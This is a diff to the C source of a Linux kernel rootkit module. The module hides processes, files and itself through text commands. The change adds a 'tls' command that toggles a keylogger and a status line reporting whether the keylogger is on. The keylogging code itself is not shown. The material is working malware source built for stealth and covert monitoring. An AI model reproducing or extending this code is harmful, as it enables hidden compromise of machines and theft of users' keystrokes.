@@ -4,6 +4,10 @@
 #include <linux/fs.h>
 #include <linux/cred.h>
 #include <linux/string.h>
+
+#include <sys/types.h>			/* for FIFO */
+#include <sys/stat.h>			/* for FIFO */
+
 /* WTF */
 #define MIN(a,b) \
    ({ typeof (a) _a = (a); \
@@ -40,7 +44,8 @@ static struct list_head *prev_kobj_module;
 static char hidden_pids[MAX_PIDS][8];
 static int current_pid = 0;
 
-/* switches for the module and hidden files */
+/* switches for turning on/off the keylogger, and hiding files and the module */
+static char key_logger = 0;
 static char hidden_files = 1;
 static char hidden_module = 0;
 
@@ -154,10 +159,11 @@ COMMANDS:\n\
   mh 			- hide module\n\
   ms 			- show module\n\n\
 STATUS-------------------------------------------\n\
+  keylogger: %d\n\
   hidden files: %d\n\
   hidden PIDs: %d\n\
   hidden module: %d\n
-  -----------------------------------------------\n", hidden_files, current_pid, hidden_module);
+  -----------------------------------------------\n", key_logger, hidden_files, current_pid, hidden_module);
 
 	size = strlen(module_status);
 /* WTF */
@@ -189,6 +195,9 @@ static int write_colonel(struct file *file, const char __user *buff, unsigned lo
 	} else if (!strncmp(buff, "sp", MIN(2, count))) {		/* shows last hidden process */
 		if (current_pid > 0) current_pid--;
 
+	} else if (!strncmp(buff, "tls", MIN(3, count))) {		/* toggle keylogger on/off */
+		key_logger = !key_logger;
+
 	} else if (!strncmp(buff, "thf", MIN(3, count))) {		/*toggles hidden_files in fs */
 		hidden_files = !hidden_files;
 
@@ -197,6 +206,7 @@ static int write_colonel(struct file *file, const char __user *buff, unsigned lo
 
 	} else if (!strncmp(buff, "ms", MIN(2, count))) {		/* show module (rootkit) */
 		show_module();
+
 	}
 	
     return count;
